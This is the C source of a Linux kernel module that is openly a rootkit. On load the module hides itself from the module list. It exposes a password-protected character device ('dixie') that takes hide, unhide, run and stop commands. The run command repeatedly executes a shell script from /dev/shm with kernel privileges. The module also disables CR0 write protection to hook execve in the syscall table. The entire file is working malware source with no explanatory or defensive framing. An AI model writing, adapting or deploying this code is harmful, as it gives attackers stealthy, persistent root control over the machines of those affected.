#include <linux/module.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/kallsyms.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/cdev.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/delay.h>
#include <linux/device.h>
#include <linux/string.h>
#include <linux/unistd.h>
#include <asm/uaccess.h>
#include <asm/paravirt.h>
#include <asm/pgtable.h>

#define MIN(a,b) \
	({ typeof (a) _a = (a); \
	 typeof (b) _b = (b); \
	 _a < _b ? _a : _b; })


#define DEBUG 1

#define RK_CMD "/dev/shm/rk.sh"
#define RK_PASSWORD "dixie"
#define RK_PASSWORD_LEN 5
#define RK_DEVICE_NAME "rootkit"
#define BUF_SIZE 256

static int open = 0;
static char msg_buf[BUF_SIZE];
struct task_struct *rk_kthread;
unsigned long *syscall_table = NULL;
unsigned int hidden = 0;
unsigned int thread_running = 0;
pte_t *pte;


static struct list_head *rk_mod;

extern unsigned long __force_order;

void rk_hide(void);
void rk_unhide(void);
void rk_start_cmd_thread(void);

static int
device_open(struct inode *inode, struct file *file)
{
	if (open)
		return -EBUSY;

	open = 1;
	try_module_get(THIS_MODULE);

	return 0;
}

static int
device_release(struct inode *inode, struct file *file)
{
	open = 0;
	module_put(THIS_MODULE);
	return 0;
}

static ssize_t
device_read(struct file *file, char *buf, size_t length, loff_t *offset)
{
	return 0;
}

static ssize_t
device_write(struct file *file, const char __user *buf, size_t len, loff_t *off)
{
	if (copy_from_user(msg_buf, buf, BUF_SIZE) != 0) return -EFAULT;

	if (!strncmp(msg_buf, RK_PASSWORD, MIN(RK_PASSWORD_LEN, len))) {
		const char *cmd = msg_buf+RK_PASSWORD_LEN+1;
		int cmd_len = len-RK_PASSWORD_LEN-1;
		if (!strncmp(cmd, "hide", MIN(4, cmd_len))) {
			rk_hide();
		} else if (!strncmp(cmd, "unhide", MIN(6, cmd_len))) {
			rk_unhide();
		} else if (!strncmp(cmd, "run", MIN(3, cmd_len))) {
			rk_start_cmd_thread();
		} else if (!strncmp(cmd, "stop", MIN(3, cmd_len))) {
			if (thread_running != 1) return len;
			kthread_stop(rk_kthread);
			thread_running = 0;
		}
	}

	return len;
}

static struct file_operations fops = {
	.read = device_read,
	.write = device_write,
	.open = device_open,
	.release = device_release
};

void rk_dev_init_module(void)
{
	register_chrdev(0, RK_DEVICE_NAME, &fops);
}

void rk_dev_cleanup_module(void)
{
	unregister_chrdev(0, RK_DEVICE_NAME);
}

asmlinkage int
(*real_execve)(const char *filename, char *const argv[], char *const envp[]);

asmlinkage int new_execve
(const char *filename, char *const argv[], char *const envp[])
{
	return real_execve(filename, argv, envp);
}

static int
rk_thread(void *data)
{
	do {
		call_usermodehelper(RK_CMD, NULL, NULL, UMH_NO_WAIT);
		msleep(10000);
	} while(!kthread_should_stop());
	return 0;
}

void
rk_start_cmd_thread(void)
{
	int cpu = 0;
	if (thread_running == 1) return;
	thread_running = 1;

	rk_kthread = kthread_create(rk_thread, &cpu, "rootkit");
	kthread_bind(rk_kthread, cpu);
	wake_up_process(rk_kthread);
}

void
rk_hide(void)
{
	if (hidden) return;

	rk_mod = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;

	hidden = 1;
}

void
rk_unhide(void)
{
	if (!hidden) return;

	list_add(&THIS_MODULE->list, rk_mod);

	hidden = 0;
}

inline void rk_write_cr0(unsigned long cr0) {
	asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}

void
rk_hijack_execve(void)
{
#if LINUX_VERSION_CODE < KERNEL_VERSION(5,3,0)
	unsigned int level;
	syscall_table = NULL;

	syscall_table = (void *)kallsyms_lookup_name("sys_call_table");
	pte = lookup_address((long unsigned int)syscall_table, &level);
	if (syscall_table != NULL) {
		write_cr0 (read_cr0 () & (~ 0x10000));
		real_execve = (void *)syscall_table[__NR_execve];
		syscall_table[__NR_execve] = &new_execve;
		write_cr0 (read_cr0 () | 0x10000);
	}
#else
	unsigned long cr0 = read_cr0();
	clear_bit(16, &cr0);
	rk_write_cr0(cr0);
#endif
}

void
rk_unhijack_execve(void)
{
#if LINUX_VERSION_CODE < KERNEL_VERSION(5,3,0)
	if (syscall_table != NULL) {
		write_cr0 (read_cr0 () & (~ 0x10000));
		syscall_table[__NR_execve] = real_execve;
		write_cr0 (read_cr0 () | 0x10000);
	} 
#else
	unsigned long cr0 = read_cr0();
	set_bit(16, &cr0);
	rk_write_cr0(cr0);
#endif
}

static int __init
rk_init(void)
{
	rk_hide();
	rk_dev_init_module();
	rk_hijack_execve();

	return 0;
}


static void __exit
rk_exit(void)
{
	rk_dev_cleanup_module();
	rk_unhijack_execve();
	if (thread_running == 1) {
		kthread_stop(rk_kthread);
	}
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_AUTHOR("dixie");
MODULE_LICENSE("GPL");
